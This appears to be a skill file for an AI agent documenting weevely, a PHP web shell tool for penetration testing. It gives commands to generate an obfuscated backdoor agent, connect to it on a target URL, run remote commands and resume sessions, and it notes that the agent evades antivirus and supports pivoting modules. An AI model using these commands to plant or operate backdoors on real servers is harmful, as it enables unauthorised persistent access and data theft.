---
name: weevely
description: A stealth PHP web shell that simulates a telnet-like connection for post-exploitation. Use to maintain access, manage remote web accounts, and execute commands on a compromised web server via a small, obfuscated agent. Trigger during web application penetration testing or post-exploitation phases when a PHP execution vulnerability is found.
---

# weevely

## Overview
Weevely is a stealthy PHP web shell designed for post-exploitation. It provides a weaponized terminal-like interface to a remote target by uploading a small, password-protected PHP agent. It features over 30 modules for administrative tasks, privilege escalation, and network pivoting. Category: Post-Exploitation / Web Application Testing.

## Installation (if not already installed)
Assume weevely is already installed. If you get a "command not found" error:

```bash
sudo apt install weevely
```

Dependencies: python3, python3-dateutil, python3-mako, python3-prettytable, python3-socks, python3-yaml.

## Common Workflows

### 1. Generate a new backdoor agent
Create an obfuscated PHP file with a specific password to upload to the target.
```bash
weevely generate mypassword shell.php
```

### 2. Connect to a deployed agent
Start an interactive session with a shell already uploaded to a URL.
```bash
weevely http://target.com/path/to/shell.php mypassword
```

### 3. Execute a single command and exit
Run a command non-interactively on the target.
```bash
weevely http://target.com/shell.php mypassword "ls -la /etc/"
```

### 4. Recover an existing session
Resume a previous session using the session file.
```bash
weevely session sessions/target.com/shell.session
```

## Complete Command Reference

```bash
weevely [-h] {terminal,session,generate} ...
```

### Global Options
| Flag | Description |
|------|-------------|
| `-h`, `--help` | Show help message and exit |

### Subcommands

#### generate
Generate a new agent (backdoor) file.
```bash
weevely generate <password> <path>
```
*   **password**: The password used to obfuscate the agent and authenticate the session.
*   **path**: The local filename/path where the generated PHP agent will be saved.

#### terminal
Run a terminal or a single command on the target.
```bash
weevely terminal <url> <password> [cmd]
```
*   **url**: The remote URL where the agent is located.
*   **password**: The password used during agent generation.
*   **cmd**: (Optional) A specific command to execute. If omitted, an interactive terminal starts.

#### session
Recover an existing session from a session file.
```bash
weevely session <session_file>
```
*   **session_file**: Path to the session file (usually stored in the `sessions/` directory).

## Notes
- **Stealth**: The agent is polymorphic and obfuscated to bypass AV/HIDS. Communication is hidden within HTTP requests.
- **Internal Modules**: Once inside the interactive terminal, use `:help` to list available post-exploitation modules (e.g., `:file_download`, `:sql_console`, `:net_proxy`).
- **Session Storage**: Weevely automatically saves session information (URL, password, history) in the `~/.weevely/sessions/` directory.